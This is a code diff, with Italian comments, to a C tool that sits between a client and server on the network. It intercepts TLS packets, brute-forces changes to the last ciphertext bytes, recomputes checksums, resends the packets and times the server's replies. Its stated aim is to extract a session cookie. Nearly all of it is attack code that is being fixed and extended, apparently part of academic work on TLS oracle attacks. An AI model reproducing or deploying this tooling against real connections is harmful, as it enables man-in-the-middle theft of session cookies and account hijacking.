@@ -41,8 +41,11 @@ Data_packet *data_packet;
 pthread_cond_t attack_thread_cond = PTHREAD_COND_INITIALIZER;
 pthread_mutex_t attack_thread_mutex = PTHREAD_MUTEX_INITIALIZER;
 bool attack;
-Byte *cookie; //define the large with thre realloc function
+Byte *cookie; //memorizza il cookie estratto fino a quel momento
 pcap_t *pcap_handle;
+Byte val_penultimate_byte = 0x00; //questo ed il successivo servono per la modifica degli ultimi 2 byte
+Byte val_last_byte = 0x00;
+Byte single_byte = 0x00;  //serve per la modifica del singolo byte 
 
 #define DIM_PAGE 4096
 
@@ -91,7 +94,7 @@ int main(int argc, char *argv[]) {
     network_config = argv[2][1];
   }
 
-  data_packet = (Data_packet *)malloc(sizeof(Data_packet));
+  data_packet = (Data_packet *)calloc(1, sizeof(Data_packet));
   if(!data_packet){
     perror("Error allocating memory for data_packet! \n");
     exit(EXIT_FAILURE);
@@ -112,6 +115,7 @@ int main(int argc, char *argv[]) {
       break;
     case 'n':
       get_network_info(my_ip, gateway_ip);
+      printf("Mio indirizo ip locale: %s \n indirizzo ip default gateway: %s \n", my_ip, gateway_ip);
       //extract ip client by the passed arguments
       if(argc < 5){
         perror("Missing arguments!");
@@ -216,6 +220,7 @@ void intercept_packets() {
     if(rcv > 0){
       nfq_handle_packet(h, buffer, rcv);
     }
+    printf("rcv: %d \n", rcv);
   }while(rcv > 0);
 
 }
@@ -270,6 +275,34 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         }
 
         //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)
+
+        pthread_mutex_lock(&attack_thread_mutex);
+
+        if(attack == true){
+          pthread_mutex_unlock(&attack_thread_mutex);
+          return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
+        }
+
+        if(data_packet->packet != NULL){
+          free(data_packet->packet);
+          data_packet->packet = NULL;
+        }
+
+        if(data_packet->ip_header != NULL){
+          free(data_packet->ip_header);
+          data_packet->ip_header = NULL;
+        }
+
+        if(data_packet->tcp_header != NULL){
+          free(data_packet->tcp_header);
+          data_packet->tcp_header = NULL;
+        }
+
+        if(data_packet->data != NULL){
+          free(data_packet->data);
+          data_packet->data = NULL;
+        }
+
         //allocate memory for the packet
         data_packet->packet = (unsigned char *)malloc(payload_len * sizeof(unsigned char));
         if(!data_packet->packet){
@@ -280,21 +313,21 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         data_packet->len = payload_len;//i need to pass the entire packet to calculate the new checksum
         
         //allocate memory for the ip_header
-        data_packet->ip_header = (struct iphdr *)malloc(sizeof(struct iphdr));
+        data_packet->ip_header = (struct iphdr *)malloc(iphdr_size);
         if(!data_packet->ip_header){
           perror("Error allocating memory for data_packet->ip_header! \n");
           exit(EXIT_FAILURE);
         }
-        memcpy(data_packet->ip_header, ip_header, sizeof(struct iphdr));
+        memcpy(data_packet->ip_header, ip_header, iphdr_size);
         data_packet->ip_header_len = iphdr_size;
 
         //allocate memory for the tcp_header
-        data_packet->tcp_header = (struct tcphdr *)malloc(sizeof(struct tcphdr));
+        data_packet->tcp_header = (struct tcphdr *)malloc(tcphdr_size);
         if(!data_packet->tcp_header){
           perror("Error allocating memory for data_packet->tcp_header! \n");
           exit(EXIT_FAILURE);
         }
-        memcpy(data_packet->tcp_header, tcp_header, sizeof(struct tcphdr));
+        memcpy(data_packet->tcp_header, tcp_header, tcphdr_size);
         data_packet->tcp_header_len = tcphdr_size;
 
         //allocate memory for the application data
@@ -308,10 +341,9 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
 
         attack = true;
         pthread_cond_signal(&attack_thread_cond);
+        pthread_mutex_unlock(&attack_thread_mutex);
       }
-      //sveglio il thread che modifica il pacchetto, ricalcola la checksum, lo invia al server, avvia il timer, attende risposta server, all'arrivo stoppa il timer ed inoltra il pacchetto al client
 
-      //drop packet
       return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
     }
   } 
@@ -369,36 +401,27 @@ int analyze_application_data(Byte *payload, int payload_len){
 //function to modify the packet
 void modify_packet(int block_pos, int byte_pos){
 
-  //tutta la parte di creazione della maschera e xor va poi messa in una apposita funzione
-  Byte *prec_block = data_packet->data;
-  
-  Byte *bytes_to_add = NULL;
+  Byte *prec_data = data_packet->data;
 
-
-  Byte *mask = (Byte *)malloc(sizeof(Byte) * data_packet->data_len);
-  //memset(mask, 0x00 , pos_byte);
   int i;
   int num_block = 0;
 
-  //i primi 5 byte della maschera, relativi all'intestazione di tls data, devono essere tutti a 0
-  mask = make_mask(block_pos, byte_pos, data_packet);
+  if(byte_pos >= 14){
+    modify_last_bytes(data_packet, block_pos, val_penultimate_byte, val_last_byte);
+    if(val_last_byte == 0xFF){
+      val_last_byte = 0x00;
+      val_penultimate_byte = (val_penultimate_byte +1) % 0x100;
+    }else{
+      val_last_byte = (val_last_byte + 1) % 0x100;
+      //printf("valore del penultimo byte: %02x, valore dell'ultimo byte: %02x \n", val_penultimate_byte, val_last_byte);
+    }
+  }else{ 
+    data_packet->data[5 + ((block_pos-1) * 16 ) + byte_pos] = single_byte;
+    single_byte = (single_byte + 1) % 0x100;
+  }
+  
+  print_blocks(data_packet->data, data_packet->data_len);
 
-  Byte *mask_first_bytes = (Byte *) malloc(sizeof(Byte) * data_packet->data_len);
-  mask_first_bytes = make_mask_first_bytes(block_pos, data_packet);
- 
-  //xor tra maschera e pacchetto originale
-  Byte *modified_packet = xor_block(prec_block, mask, data_packet->data_len);
-  Byte *modified_first_bytes = xor_block(prec_block, mask_first_bytes, data_packet->data_len);
-
-  print_blocks(modified_packet, data_packet->data_len);
-
-  printf(" \n Stampa del'header dopo maschera! \n");
-  print_tls_header(modified_first_bytes);
-
-  printf("\n stampa del pacchetto dopo maschera first bytes!  \n");
-  print_blocks(modified_first_bytes, data_packet->data_len);
-
-  data_packet->data = modified_first_bytes;
 }
 
 //TROVARE UNA SOLUZIONE MIGLIORE ALLA GESTIONE DEL -5 SULLA GRANDEZZA DEL PACCHETTO DATA
@@ -459,7 +482,6 @@ unsigned short recalculate_checksum(){
     sum = ((sum & 0xFFFF) + (sum >> 16) & 0xFFFF);
   }while((sum >> 16) != 0);  */
   
-  printf("Sono alla fine del ciclo! \n");
   checksum = ~sum & 0xFFFF;
   
   return checksum;
@@ -484,15 +506,6 @@ void send_modified_packet(){
   if(setsockopt(smp_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark)) < 0){
     perror("Errore nel settare SO_MARK");
   }
-  /*
-  int smp_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_RAW);
-  
-
-  //restore_network_default();
-  int mark = 1;
-  if (setsockopt(smp_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark)) < 0) {
-      perror("Errore nel settare SO_MARK");
-  } */
 
   char *raw_packet;
   
@@ -508,11 +521,11 @@ void send_modified_packet(){
   server_addr.sin_addr.s_addr = data_packet->ip_header->daddr;
   server_addr.sin_port = data_packet->tcp_header->dest;
 
-  printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");
+  //printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");
 
   sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
-  printf("pacchetto mandato al server! \n");
+  //printf("pacchetto mandato al server! \n");
 
   free(raw_packet);
   close(smp_fd);
@@ -527,12 +540,13 @@ void *do_attack_thread(void *arg){
 
   unsigned short checksum;
   while(1==1){
+    // In do_attack_thread:
+    pthread_mutex_lock(&attack_thread_mutex);
     while(attack == false){
-      //pthread_mutex_lock(&attack_thread_mutex);
       pthread_cond_wait(&attack_thread_cond, &attack_thread_mutex);
-      //pthread_mutex_unlock(&attack_thread_mutex);
-    } 
-    printf("Secondo thread avviato\n");
+    }
+    pthread_mutex_unlock(&attack_thread_mutex);
+    //printf("Secondo thread avviato\n");
     /*
     printf("------Packet------ \n");
     print_application_data(data_packet->data, data_packet->data_len); */
@@ -543,17 +557,17 @@ void *do_attack_thread(void *arg){
     
     modify_packet(4,14);
 
-    printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");
+    //printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");
 
-    print_data_blocks(data_packet->data, data_packet->data_len);
+    //print_data_blocks(data_packet->data, data_packet->data_len);
 
-    printf("Recalculate checksum! \n");
+    //printf("Recalculate checksum! \n");
 
     checksum = recalculate_checksum();
 
     data_packet->tcp_header->check = checksum;
 
-    printf("Checksum: %04x \n", checksum);
+    //printf("Checksum: %04x \n", checksum);
    
     flush_pcap_buffer(pcap_handle);
     
@@ -565,6 +579,7 @@ void *do_attack_thread(void *arg){
 
     if(stop.tv_sec == 0 && stop.tv_nsec == 0){
       printf("Server didn't reply \n");
+      attack = false;
       continue;
     }
 
